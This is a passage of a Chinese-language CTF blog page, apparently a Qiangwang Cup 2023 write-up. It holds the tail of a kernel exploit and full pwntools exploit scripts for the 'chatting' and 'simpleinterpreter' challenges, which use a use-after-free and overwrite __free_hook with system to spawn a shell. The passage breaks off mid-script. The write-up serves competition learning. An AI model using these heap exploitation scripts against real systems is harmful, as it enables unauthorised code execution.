PACKET_FENGSHUI_CNT; i++) &#123;</span><br><span class="line">        close(fengshui_fds[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PACKET_SPRAY_CNT; i++) &#123;</span><br><span class="line">        close(packet_fds[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;initialize exploit environment ...&quot;</span>);</span><br><span class="line">    do_init();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (do_leak()) &#123;</span><br><span class="line">        usleep(<span class="number">100</span> * <span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;retry ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_offset = leak_ptr - <span class="number">0xffffffff81532fb0</span>;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset: 0x%lx\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (do_write_primitive()) &#123;</span><br><span class="line">        usleep(<span class="number">100</span> * <span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;retry ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/19/%E5%BC%BA%E7%BD%91%E6%9D%AFCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/19/%E5%BC%BA%E7%BD%91%E6%9D%AFCTF2023/" class="post-title-link" itemprop="url">强网杯CTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-12-19 14:26:22 / Modified: 14:27:33" itemprop="dateCreated datePublished" datetime="2023-12-19T14:26:22+08:00">2023-12-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="chatting"><a href="#chatting" class="headerlink" title="chatting"></a>chatting</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chatting: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">182890e62</span>a6cb54b4f2f7c6b809f6c43cbb4929a, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>下面这段代码有逻辑错误：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v7 = (_QWORD *)sub_406A((__int64)&amp;messageg, name);</span><br><span class="line">  <span class="keyword">if</span> ( sub_4838(v7) &lt;= <span class="number">0x64</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;HERE?&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  v5 = sub_406A((__int64)&amp;messageg, name);</span><br><span class="line">  v6 = sub_406A((__int64)&amp;messageg, name);</span><br><span class="line">  v11 = <span class="built_in">std</span>::numpunct&lt;<span class="keyword">wchar_t</span>&gt;::do_truename(v6);</span><br><span class="line">  sub_48C2(&amp;v12, (__int64)&amp;v11);</span><br><span class="line">  sub_48EC(v5, v12);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果检测到 message 的个数超过 0x64 就会将新创建的 message 释放</li>
<li>但这个被释放的 message 还是会被添加如对应的 vector 中</li>
</ul>
<p>这就造成了 UAF</p>
<p><strong>入侵思路</strong></p>
<p>先利用堆上遗留的地址泄露 heap_base 和 libc_base</p>
<p>根据程序漏洞，理论上我们拥有 double free 的权利，但 c++ 拥有格外的 tcache 检查，几乎不可能 double free</p>
<p>因此我们需要利用 switch 功能占用 UAF 堆块，二次释放后再用 switch 来修改 tcache</p>
<p>测试代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x64</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    message(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">message(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>,<span class="number">0x50</span>,<span class="string">&quot;k&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">switch(<span class="string">&quot;4&quot;</span>*<span class="number">0x50</span>) <span class="comment"># 占用UAF chunk</span></span><br><span class="line">dele(<span class="string">&quot;5&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">dele(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">switch(p64(free_hook)) <span class="comment"># 修改UAF chunk</span></span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./chatting1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.122.251&#x27;</span>,<span class="string">&#x27;14509&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x04797)\nb *$rebase(0x2B83)\nb *$rebase(0x495E)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>,op)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;add&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;username:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;delete&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;delete:&quot;</span>,name)   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;listuser&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">switch</span>(<span class="params">to</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;switch&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;to:&quot;</span>,to)  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">to,size,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;message&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;To:&quot;</span>,to)  </span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Content&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;read&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;username:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&quot;3&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">add(<span class="string">&quot;4&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">message(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="number">0x1</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">read()</span><br><span class="line">ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3ebc62</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">dele(<span class="string">&quot;4&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">message(<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>,<span class="number">0x1</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">read()</span><br><span class="line">ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x1ec63</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">&quot;4&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">&quot;5&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">&quot;6&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">add(p64(free_hook))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x64</span>):</span><br><span class="line">    sleep(<span class="number">0.01</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    message(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">message(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>,<span class="number">0x50</span>,<span class="string">&quot;k&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">switch(<span class="string">&quot;4&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">dele(<span class="string">&quot;5&quot;</span>*<span class="number">0x50</span>)</span><br><span class="line">dele(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#dele(&quot;6&quot;*0x50)</span></span><br><span class="line"></span><br><span class="line">switch(p64(free_hook))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">message(<span class="string">&quot;3&quot;</span>*<span class="number">0x400</span>,<span class="number">0x50</span>,p64(system))</span><br><span class="line">message(<span class="string">&quot;3&quot;</span>*<span class="number">0x400</span>,<span class="number">0x50</span>,p64(system))</span><br><span class="line">message(<span class="string">&quot;3&quot;</span>*<span class="number">0x400</span>,<span class="number">0x50</span>,p64(system))</span><br><span class="line"></span><br><span class="line">switch(<span class="string">&quot;/bin/sh\x00&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="simpleinterpreter"><a href="#simpleinterpreter" class="headerlink" title="simpleinterpreter"></a>simpleinterpreter</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">simpleinterpreter: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=aab6c7bbf53da3a2a56abc81abda22d25640fc3a, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>一个 C 语言的解释器，参考源码如下：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/rswier/c4/blob/master/c4.c">https://github.com/rswier/c4/blob/master/c4.c</a></li>
</ul>
<p>禁用了 system 但没有禁用 free，因此直接修改 free_hook 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./simpleinterpreter1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;101.200.122.251&#x27;</span>,<span class="string">&#x27;13410&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x034A0)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code</span>(<span class="params">payload</span>):</span></span><br><span class="line">    sla( <span class="string">b&#x27;Code size: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)+<span class="number">1</span>))</span><br><span class="line">    sa(<span class="string">&quot;interpret:&quot;</span>,payload)</span><br><span class="line">    sn(<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">void main()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	int libc_base, system, free_hook;</span></span><br><span class="line"><span class="string">	libc_base = (int)malloc(0x21000) - 0x498010 - 0x19000;</span></span><br><span class="line"><span class="string">	printf(&quot;libc_base -&gt; %p&quot;, libc_base);</span></span><br><span class="line"><span class="string">	system = libc_base + 0x4f420;</span></span><br><span class="line"><span class="string">	free_hook = libc_base + 0x3ed8e8;</span></span><br><span class="line"><span class="string">	*(int*)free_hook = system;</span></span><br><span class="line"><span class="string">	free(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">code(payload)</span><br><span class="line"></span><br><span 